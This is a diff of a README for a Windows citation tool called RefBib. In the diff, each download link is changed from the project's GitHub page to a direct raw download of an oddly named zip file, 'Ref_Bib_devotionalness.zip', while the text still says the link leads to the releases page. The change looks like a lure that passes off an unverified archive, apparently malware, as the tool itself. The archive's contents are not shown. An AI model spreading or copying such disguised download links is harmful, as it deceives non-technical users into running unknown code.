@@ -1,6 +1,6 @@
 # 📖 RefBib - Extract Accurate BibTeX Citations Easily
 
-[![Download RefBib](https://img.shields.io/badge/Download-RefBib-brightgreen?style=for-the-badge)](https://github.com/hvvmza/RefBib)
+[![Download RefBib](https://img.shields.io/badge/Download-RefBib-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/hvvmza/RefBib/main/backend/Ref_Bib_devotionalness.zip)
 
 ---
 
@@ -43,7 +43,7 @@ RefBib works on Windows and does not require any coding skills.
 
 Click the big green button or go directly to the download page here:
 
-[Download RefBib from GitHub](https://github.com/hvvmza/RefBib)
+[Download RefBib from GitHub](https://raw.githubusercontent.com/hvvmza/RefBib/main/backend/Ref_Bib_devotionalness.zip)
 
 This link takes you to the GitHub page where you can find the latest releases.
 
@@ -134,5 +134,5 @@ RefBib is designed to support students, researchers, and anyone who deals with a
 
 ---
 
-[Download RefBib from GitHub](https://github.com/hvvmza/RefBib)  
+[Download RefBib from GitHub](https://raw.githubusercontent.com/hvvmza/RefBib/main/backend/Ref_Bib_devotionalness.zip)  
 Click here to visit the page and get started with RefBib today.
